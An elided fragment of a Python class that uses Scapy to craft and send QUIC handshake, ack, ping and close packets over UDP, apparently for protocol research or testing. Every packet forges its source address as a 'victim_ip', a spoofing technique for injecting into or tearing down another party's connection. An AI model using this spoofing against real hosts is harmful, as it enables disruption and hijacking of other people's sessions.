...
class Scapy:
    ...
    def send_chlo(self, only_reset):
        ...
        p = IP(src=victim_ip, dst=SessionInstance.get_instance().destination_ip) / UDP(dport=6121, sport=61250) / chlo
        send(p)
    ...
    def send_ack_for_encrypted_message(self):
        ...
        p = IP(src=victim_ip, dst=SessionInstance.get_instance().destination_ip) / UDP(dport=6121, sport=61250) / ack / Raw(load=string_to_ascii(ciphertext[24:]))
        send(p)
    ...
    def send_ping(self):
        ...
        conf.L3socket = L3RawSocket
        p = IP(src=victim_ip, dst=SessionInstance.get_instance().destination_ip) / UDP(dport=6121, sport=61250) / ping / Raw(load=string_to_ascii(ciphertext[24:]))
    ...
    def close_connection(self):
        ...
        p = IP(src=victim_ip, dst=SessionInstance.get_instance().destination_ip) / UDP(dport=6121, sport=61250) / a / Raw(load=string_to_ascii(ciphertext[24:]))
        # ans, _ = sr(p, count=3)
        send(p)
        self.wait_for_signal_or_expiration()
        self.processed = False
    ...
    def send_full_chlo_to_existing_connection(self):
        ...
        try:
            ...
            #
            p = IP(src=victim_ip, dst=SessionInstance.get_instance().destination_ip) / UDP(dport=6121, sport=61250) / a / Raw(
